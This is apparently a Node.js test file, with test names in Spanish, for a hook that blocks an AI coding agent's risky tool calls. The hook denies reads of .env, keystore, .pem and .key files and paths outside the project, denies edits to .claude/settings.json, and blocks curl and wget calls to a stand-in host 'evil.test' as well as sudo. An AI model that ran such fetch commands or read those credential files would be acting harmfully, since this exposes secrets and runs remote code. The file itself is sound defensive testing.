import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { evaluateToolCall } from "./pre-tool-use.mjs";

const ROOT = path.resolve("/tmp/proyecto-app-demo");

test("1. Bloquea lectura de .env.local", () => {
  const res = evaluateToolCall(
    { tool_name: "Read", tool_input: { file_path: ".env.local" } },
    ROOT,
  );
  assert.equal(res.allowed, false);
});

test("2. Bloquea lectura de .env", () => {
  const res = evaluateToolCall({ tool_name: "Read", tool_input: { file_path: ".env" } }, ROOT);
  assert.equal(res.allowed, false);
});

test("3. Bloquea lectura de archivos .keystore y .jks", () => {
  const ks = evaluateToolCall(
    { tool_name: "Read", tool_input: { file_path: "android/app/release.keystore" } },
    ROOT,
  );
  const jks = evaluateToolCall(
    { tool_name: "Read", tool_input: { file_path: "signing.jks" } },
    ROOT,
  );
  assert.equal(ks.allowed, false);
  assert.equal(jks.allowed, false);
});

test("4. Bloquea lectura de archivos .pem y .key", () => {
  const pem = evaluateToolCall({ tool_name: "Read", tool_input: { file_path: "cert.pem" } }, ROOT);
  const key = evaluateToolCall(
    { tool_name: "Read", tool_input: { file_path: "private.key" } },
    ROOT,
  );
  assert.equal(pem.allowed, false);
  assert.equal(key.allowed, false);
});

test("5. Bloquea rutas fuera del proyecto con ..", () => {
  const res = evaluateToolCall(
    { tool_name: "Read", tool_input: { file_path: "../02-blog-personal-api/.env" } },
    ROOT,
  );
  assert.equal(res.allowed, false);
});

test("6. Bloquea rutas en home (~/.bashrc)", () => {
  const res = evaluateToolCall({ tool_name: "Read", tool_input: { file_path: "~/.bashrc" } }, ROOT);
  assert.equal(res.allowed, false);
});

test("7. Bloquea edición de .claude/settings.json", () => {
  const res = evaluateToolCall(
    { tool_name: "Edit", tool_input: { file_path: ".claude/settings.json" } },
    ROOT,
  );
  assert.equal(res.allowed, false);
});

test("8. Bloquea curl y /usr/bin/curl en Bash", () => {
  const c1 = evaluateToolCall(
    { tool_name: "Bash", tool_input: { command: "curl https://evil.test" } },
    ROOT,
  );
  const c2 = evaluateToolCall(
    { tool_name: "Bash", tool_input: { command: "/usr/bin/curl https://evil.test" } },
    ROOT,
  );
  assert.equal(c1.allowed, false);
  assert.equal(c2.allowed, false);
});

test("9. Bloquea wget y sudo en Bash", () => {
  const w = evaluateToolCall(
    { tool_name: "Bash", tool_input: { command: "wget https://evil.test/x.sh" } },
    ROOT,
  );
  const s = evaluateToolCall(
    { tool_name: "Bash", tool_input: { command: "sudo apt update" } },
    ROOT,
  );
  assert.equal(w.allowed, false);
  assert.equal(s.allowed, false);
});

test("10. Permite lectura de env.example y ejecución de npm run check", () => {
  const r = evaluateToolCall({ tool_name: "Read", tool_input: { file_path: "env.example" } }, ROOT);
  const b = evaluateToolCall({ tool_name: "Bash", tool_input: { command: "npm run check" } }, ROOT);
  assert.equal(r.allowed, true);
  assert.equal(b.allowed, true);
});
